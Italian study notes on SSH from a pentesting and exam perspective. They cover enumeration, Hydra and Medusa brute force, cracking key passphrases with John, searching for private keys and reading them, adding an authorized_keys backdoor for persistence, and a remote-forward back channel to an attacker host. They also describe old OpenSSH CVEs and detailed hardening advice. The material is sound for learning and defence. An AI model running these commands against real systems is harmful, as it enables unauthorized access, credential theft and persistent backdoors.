Tipo: Protocollo / Servizio Porta: 22 Rischio: 🟡 Medio (dipende dalla configurazione) tags:

- protocollo
- ssh
- enumeration
- brute-force
- privesc

---

# 🔐 SSH — Secure Shell

> [!info] Nota SSH è il protocollo di accesso remoto standard su Linux. Di per sé è sicuro, ma una configurazione errata o credenziali deboli lo rendono un vettore di attacco comune in CTF e nel mondo reale.

---

## 🧠 Cos'è

SSH (Secure Shell) è un protocollo crittografato per l'accesso remoto a terminale, il trasferimento di file e il tunneling di connessioni. Nasce negli anni '90 come sostituto sicuro di Telnet, rsh e rlogin.

|Campo|Valore|
|---|---|
|**Porta default**|22/TCP|
|**Protocollo**|TCP|
|**Crittografia**|✅ Sì (AES, ChaCha20, ecc.)|
|**Autenticazione**|Password / Chiave pubblica / Certificati|
|**RFC**|RFC 4251-4254|
|**Implementazione comune**|OpenSSH|

---

## 🔍 Enumeration

```bash
# Banner grabbing — rivela versione OpenSSH e OS
nmap -sC -sV -p 22 <IP>
nc -nv <IP> 22

# Script nmap utili
nmap -p 22 --script ssh-auth-methods <IP>       # metodi di autenticazione accettati
nmap -p 22 --script ssh-hostkey <IP>            # host key del server
nmap -p 22 --script ssh2-enum-algos <IP>        # algoritmi supportati
```

**Esempio output banner:**

```
22/tcp open  ssh  OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
```

> [!tip] Il banner è oro La versione di OpenSSH può rivelare la distribuzione Linux esatta (es. `4ubuntu0.5` → Ubuntu 20.04). Cerca su CVEdetails o ExploitDB la versione trovata.

---

## 💥 Exploitation

### 1. Brute force su password

```bash
# Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4

# Medusa
medusa -h <IP> -u root -P /usr/share/wordlists/rockyou.txt -M ssh

# Nmap
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=rockyou.txt <IP>
```

### 2. Accesso con chiave privata trovata

```bash
# Se trovi una chiave id_rsa durante l'enumeration (es. su un web server, FTP, ecc.)
chmod 600 id_rsa
ssh -i id_rsa <utente>@<IP>

# Se la chiave è protetta da passphrase → crackala con John
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### 3. Credenziali di default / trovate altrove

```bash
# Accesso diretto con credenziali note
ssh <utente>@<IP>
ssh root@<IP>
```

### 4. Username enumeration (versioni vecchie OpenSSH)

Alcune versioni di OpenSSH vulnerabili a **CVE-2018-15473** permettono di enumerare username validi attraverso differenze nei tempi di risposta.

```bash
# Tool specifico
python3 ssh-username-enum.py --userList users.txt <IP>

# Con Metasploit
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS <IP>
set USER_FILE users.txt
run
```

---

## 🗝️ Chiavi SSH — punti da controllare

Quando sei già dentro un sistema, cerca chiavi SSH per muoverti lateralmente:

```bash
# Chiavi private dell'utente corrente
cat ~/.ssh/id_rsa
cat ~/.ssh/id_ecdsa

# Chiavi autorizzate (chi può entrare come questo utente)
cat ~/.ssh/authorized_keys

# Cerca chiavi in tutto il sistema
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

> [!warning] Movimento laterale Se trovi una `id_rsa` leggibile di un altro utente, puoi usarla per fare SSH come quell'utente — anche senza conoscere la sua password.

---

## 🔓 Misconfigurazioni comuni

|Misconfiguration|Impatto|Come verificare|
|---|---|---|
|Login root abilitato|Accesso diretto come root|`grep PermitRootLogin /etc/ssh/sshd_config`|
|Autenticazione a password abilitata|Vulnerabile a brute force|`grep PasswordAuthentication /etc/ssh/sshd_config`|
|Chiave privata leggibile da altri utenti|Movimento laterale|`ls -la ~/.ssh/`|
|Versione OpenSSH obsoleta|CVE noti|Banner grabbing|
|`authorized_keys` scrivibile|Backdoor persistente|`ls -la ~/.ssh/authorized_keys`|

---

## 🚪 SSH come vettore di Persistence

Se ottieni accesso root, puoi aggiungere la tua chiave pubblica per mantenere l'accesso:

```bash
# Sul tuo kali — genera la coppia di chiavi
ssh-keygen -t rsa -b 4096

# Sul target — aggiungi la tua chiave pubblica
echo "<tua_chiave_pubblica>" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Da ora puoi entrare senza password
ssh -i ~/.ssh/id_rsa root@<IP>
```

---

## 🌐 SSH Tunneling (Port Forwarding)

Utile per raggiungere servizi interni non esposti direttamente:

```bash
# Local port forwarding — porti il servizio interno sulla tua macchina
# (accedi a 127.0.0.1:8080 sul tuo kali per raggiungere 192.168.1.10:80 interno)
ssh -L 8080:192.168.1.10:80 utente@<IP>

# Dynamic port forwarding — crei un proxy SOCKS
ssh -D 1080 utente@<IP>
# Poi usa proxychains per instradare il traffico

# Remote port forwarding
ssh -R 4444:127.0.0.1:4444 utente@<IP>
```

---

## 🧪 Visto in azione

|Macchina|Piattaforma|Come usato|
|---|---|---|
|[[Macchine/Meow\|Meow]]|HackTheBox|SSH non esposto; accesso via Telnet poi shell diretta|

---

## 🛡️ Remediation (per il report)

- Disabilitare il login root via SSH (`PermitRootLogin no`)
- Disabilitare l'autenticazione a password e usare solo chiavi (`PasswordAuthentication no`)
- Limitare gli utenti che possono fare SSH (`AllowUsers`)
- Aggiornare OpenSSH all'ultima versione stabile
- Usare Fail2Ban per bloccare brute force
- Cambiare la porta da 22 a una non standard (sicurezza per oscurità, non sufficiente da sola)

---

## 🔗 Riferimenti

- [HackTricks — Pentesting SSH](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)
- [OpenSSH — sshd_config](https://man.openbsd.org/sshd_config)
- [CVE-2018-15473 — Username Enumeration](https://nvd.nist.gov/vuln/detail/CVE-2018-15473)
- [[Vulnerabilità/Brute Force|Brute Force]]
- [[Vulnerabilità/Default Credentials|Default Credentials]]
- [[Telnet|Telnet]] — il predecessore insicuro

# Vulnerabilità Hacking Exposed 7

Sì, update SSH è la takeaway pratica. Le due vulnerabilità sono concettualmente già roba che conosci.

---

**Vuln 1 — CRC-32 attack detector: integer overflow → xmalloc(0)**

SSH1 aveva un attacco crittografico noto (insertion attack). Aggiungono una patch: un "CRC-32 compensation attack detector". La patch introduce un nuovo bug.

Il detector alloca una hash table dinamicamente, e la dimensione dipende dalla lunghezza del pacchetto ricevuto. Il problema: la variabile che contiene la lunghezza è dichiarata con il tipo sbagliato. Se mandi un pacchetto con length > 2¹⁶ (65536), il calcolo della dimensione della hash table fa **integer overflow → wrappa a 0**.

Risultato: `xmalloc(0)` — alloca zero byte. Su molte implementazioni `malloc(0)` restituisce un puntatore valido in memoria, non NULL. Il codice poi scrive su quell'area come se fosse la hash table → **scrittura arbitraria in memoria → arbitrary code execution**.

Questo è esattamente il pattern di [[integer_overflow_attacks]]: il bug class è integer overflow/truncation, la exploitation technique che ci finisce sopra è heap corruption. Identico a ciò che hai studiato.

---

**Vuln 2 — Challenge-Response: due bug separati**

_Sub-bug A (BSD_AUTH / SKEY)_: durante la challenge-response authentication, il numero di risposte ricevute viene usato per calcolare la dimensione di un buffer. Integer overflow sul conteggio → buffer allocato troppo piccolo → heap overflow → root. Stesso schema della vuln 1.

_Sub-bug B (PAM + keyboard-interactive)_: indipendente dalla configurazione challenge-response. Se il sistema usa PAM con `PAMAuthenticationViaKbdInt`, c'è un buffer overflow classico nel meccanismo → root remoto. Questo non richiede neanche che challenge-response sia abilitato — basta PAM keyboard-interactive attivo.

---

**Il filo comune:**

Entrambe le vulnerabilità sono **pre-auth remote root**: l'attaccante non ha bisogno di credenziali, colpisce nella fase di autenticazione, ottiene root sul daemon che per definizione gira come root. Stesso motivo per cui rpc.statd era così pericoloso ([[nfs_attacks]]) — servizio root che parsa input esterno complesso.

**Oggi**: OpenSSH moderno non ha questi bug (sono del 2001-2002), ma il pattern si ripete — OpenSSH ha avuto CVE anche recenti (CVE-2024-6387 "regreSSHion" — race condition nel signal handler, remote code execution). Il principio "aggiorna SSH" non è mai obsoleto.

---
## tags: [eth, unix-hacking, remote-access, cryptography, authentication] capitolo: HE7 Ch.5 collegato: [[integer_overflow_attacks]], [[nfs_attacks]], [[rlogin_rhosts]], [[dns_attacks]]

# SSH / OpenSSH — Architettura e Vulnerabilità

## Cos'è e perché esiste

SSH = **Secure Shell**. Rimpiazza Telnet/rlogin/rsh ([[rlogin_rhosts]]) — protocolli legacy che trasmettevano credenziali in chiaro. Fornisce:

- Autenticazione (server + client)
- Cifratura del canale
- Integrità dei dati
- Port forwarding / tunneling
- Trasferimento file (SCP, SFTP)

Porta standard: **22/tcp**.

**OpenSSH** è l'implementazione open-source dominante (origine OpenBSD, 1999). Praticamente universale su Linux/BSD/macOS.

---

## Architettura

SSH è strutturato in tre layer:

|Layer|Funzione|
|---|---|
|**Transport**|Negozia cifratura, scambio chiavi (Diffie-Hellman), integrità (MAC), autentica il server|
|**Authentication**|Autentica il client (password, publickey, hostbased, keyboard-interactive)|
|**Connection**|Multiplexing di canali sopra il transport cifrato (shell, exec, port forward, X11 forward)|

### Connection setup (high-level)

```
1. TCP handshake (porta 22)
2. SSH version exchange  ← "SSH-2.0-OpenSSH_9.6"
3. Algorithm negotiation (cifrari, MAC, key exchange)
4. Key exchange (Diffie-Hellman) → session keys condivise
5. Server authentication (host key vs ~/.ssh/known_hosts)
6. Client authentication (qui entrano i metodi)
7. Channel multiplexing → shell, sftp, port forward, ecc.
```

---

## SSH1 vs SSH2

|Aspetto|SSH1|SSH2|
|---|---|---|
|Anno|1995|2006 (RFC 4251)|
|Architettura|Monolitica|Layered (transport/auth/connection)|
|Integrità|CRC-32 (debole)|HMAC|
|Cifratura|Sessione singola|Algoritmi separati per direzione|
|Vulnerabilità note|Insertion attack, CRC-32 attack detector bug|Nessuna strutturale al protocollo|
|Stato|**Deprecato, da non usare**|Standard attuale|

OpenSSH ha rimosso il supporto SSH1 di default da OpenSSH 7.0 (2015), e completamente da OpenSSH 7.6 (2017). Trovarlo abilitato oggi = sistema legacy abbandonato.

---

## Metodi di Autenticazione

|Metodo|Come funziona|Sicurezza|
|---|---|---|
|**password**|Password trasmessa nel canale cifrato|OK se password forte, ma soggetta a brute force|
|**publickey**|Client firma una challenge con chiave privata; server verifica con chiave pubblica in `~/.ssh/authorized_keys`|Forte se la chiave è protetta|
|**hostbased**|Trust basato su host del client (erede `.rhosts`)|Debole — vedi [[rlogin_rhosts]]|
|**keyboard-interactive**|Server invia prompt, client risponde — usato per 2FA, PAM|Dipende dal backend|
|**gssapi**|Kerberos|Forte ma deployment complesso|

**Best practice attuale**: publickey + disabilita password auth (`PasswordAuthentication no` in `sshd_config`).

---

## Attack Surface

### 1. Brute Force su password

```bash
hydra -L users.txt -P passwords.txt ssh://target -t 4
medusa -h target -U users.txt -P passwords.txt -M ssh
```

Mitigazioni: `fail2ban`, rate limit a livello di firewall, disabilitare password auth, usare chiavi.

---

### 2. Username Enumeration

Storicamente, alcuni server rispondevano in tempi diversi a username validi vs invalidi → enumeration tramite timing side channel. CVE-2018-15473 in OpenSSH è esempio recente.

---

### 3. Host Key Trust on First Use (TOFU)

Alla prima connessione il client mostra la host key del server:

```
The authenticity of host 'target (1.2.3.4)' can't be established.
ED25519 key fingerprint is SHA256:xxxxx.
Are you sure you want to continue connecting (yes/no)?
```

99% degli utenti dice "yes" senza verificare. **Finestra MITM su prima connessione**: se un attaccante è in posizione di rete durante la prima connessione, può presentare la propria chiave, il client la accetta e la salva in `known_hosts`. Da quel momento il MITM è permanente.

Mitigazioni: SSHFP record DNS (richiede DNSSEC, vedi [[dns_attacks]]), distribuzione out-of-band della host key, SSH certificates.

---

### 4. Key Management Issues

- **Chiavi senza passphrase** in `~/.ssh/` → se compromesso il filesystem, accesso immediato ovunque
- **Chiavi orfane** in `~/.ssh/authorized_keys` di ex-dipendenti / vecchi deploy
- **Agent forwarding (`ssh -A`)** abusato: il server può chiedere all'agent locale di firmare → se il server è compromesso, può fare lateral movement come te
- **`StrictHostKeyChecking no`** in script automatici → MITM facile

---

### 5. Port Forwarding Abuse

```bash
# Local forwarding — bypass firewall in uscita
ssh -L 8080:internal-target:80 user@jumpbox

# Remote forwarding — back channel
ssh -R 4444:localhost:22 attacker@server
# ora attacker:4444 → tua porta 22 — bypass NAT
```

Tipico post-exploit: una shell SSH con remote forwarding apre un canale persistente attraverso il NAT della vittima. Concetto identico al back channel ([[x_window_system_attacks]]), trasporto diverso.

---

### 6. CVE storici — Memory corruption

#### SSH1 CRC-32 attack detector (2001)

SSH1 aveva un attacco crittografico ("insertion attack") sul protocollo. Patch: aggiungere un CRC-32 compensation attack detector. Il detector aveva un bug:

```
- Hash table allocata in base alla lunghezza del pacchetto
- Variabile di lunghezza dichiarata con tipo sbagliato
- Pacchetto > 2^16 byte → integer overflow → wrap a 0
- xmalloc(0) restituisce un puntatore valido nell'address space
- Scrittura sulla "hash table" → write arbitrario in memoria
- Arbitrary code execution
```

Pattern classico [[integer_overflow_attacks]]: bug class = integer overflow, exploitation = heap corruption. Pre-auth remote root.

**Affetti**: OpenSSH < 2.3.0, SSH-1.2.24 - SSH-1.2.31.

---

#### OpenSSH Challenge-Response (2002, CVE-2002-0639/0640)

Due bug separati nella stessa categoria:

**Sub-bug A (BSD_AUTH / SKEY):** Durante challenge-response auth, il numero di risposte usato per calcolare la dimensione di un buffer. Integer overflow sul conteggio → buffer troppo piccolo → heap overflow → root.

**Sub-bug B (PAM + keyboard-interactive):** Indipendente dalla configurazione challenge-response. Se `PAMAuthenticationViaKbdInt` attivo → buffer overflow nel meccanismo → root remoto.

**Affetti**: OpenSSH 2.9.9 - 3.3.

Entrambi sono **pre-auth remote root** — nessuna credenziale necessaria.

---

#### regreSSHion (2024, CVE-2024-6387)

Race condition nel signal handler di OpenSSH (sshd). RCE remoto pre-auth via timing su SIGALRM handler che chiama funzioni async-unsafe. Sfruttamento difficile in pratica (richiede ore/giorni di attempt), ma teoricamente devastante. Affetti: glibc Linux con OpenSSH 8.5p1 - 9.7p1.

> Nota nominale: "regression" perché è la **regressione** di un bug fixato 18 anni prima (CVE-2006-5051) e re-introdotto silenziosamente in 8.5p1.

---

## Countermeasures

### Configurazione `sshd_config` essenziale

```bash
# Disabilita SSH1 (default ormai)
Protocol 2

# Solo chiavi, no password
PasswordAuthentication no
PubkeyAuthentication yes

# No root login diretto
PermitRootLogin no

# Limita utenti che possono fare SSH
AllowUsers alice bob
AllowGroups sshusers

# Privilege separation (default moderno)
UsePrivilegeSeparation sandbox

# Disabilita metodi deboli
HostbasedAuthentication no
RhostsRSAAuthentication no

# Timeout per sessioni idle
ClientAliveInterval 300
ClientAliveCountMax 2

# Disabilita TCP/X11 forwarding se non serve
AllowTcpForwarding no
X11Forwarding no
```

### Operazionali

|Pratica|Perché|
|---|---|
|`fail2ban` o equivalente|Blocca brute force|
|Cambia porta (security through obscurity)|Riduce rumore, non aumenta sicurezza|
|2FA via PAM|Difesa in profondità se credenziali compromesse|
|Chiavi con passphrase + ssh-agent|Compromise del file system != compromise immediato|
|SSH certificates invece di authorized_keys|Centralizza il trust, scadenze, revoca|
|Bastion host / jump server|Single point di audit e access control|
|Audit periodico `authorized_keys`|Rimuovi chiavi orfane|
|**Update OpenSSH**|Patchato regolarmente — i CVE sopra dimostrano il perché|

---

## TL;DR esame

1. SSH1 deprecato, SSH2 standard
2. Architettura: transport (cifratura) + auth (vari metodi) + connection (multiplexing)
3. Auth methods: password, publickey, hostbased (eredità .rhosts), keyboard-interactive, gssapi
4. Vuln strutturali storiche: CRC-32 (SSH1, integer overflow → xmalloc(0)), Challenge-Response (OpenSSH 2.9.9-3.3, integer/buffer overflow)
5. Vuln strutturale recente: regreSSHion (2024) — race condition signal handler, pre-auth RCE
6. Pattern attacchi vivi oggi: brute force, MITM su TOFU, key management, agent forwarding abuse, port forwarding per back channel
7. Fix universale: pubkey + no password + fail2ban + update + jumphost

---

## Concetto chiave

Le vulnerabilità memory corruption di SSH (sia CRC-32 sia Challenge-Response) sono **pre-auth remote root** — esattamente come [[nfs_attacks]] con rpc.statd. Il pattern è universale:

> Servizio root + parsing complesso di input esterno + nessuna autenticazione richiesta = bug factory garantita.

Vale per SSH, rpc.statd, BIND, sendmail, Apache mod_*, qualsiasi cosa esposta su internet con privilegi alti. Aggiornare non è opzionale.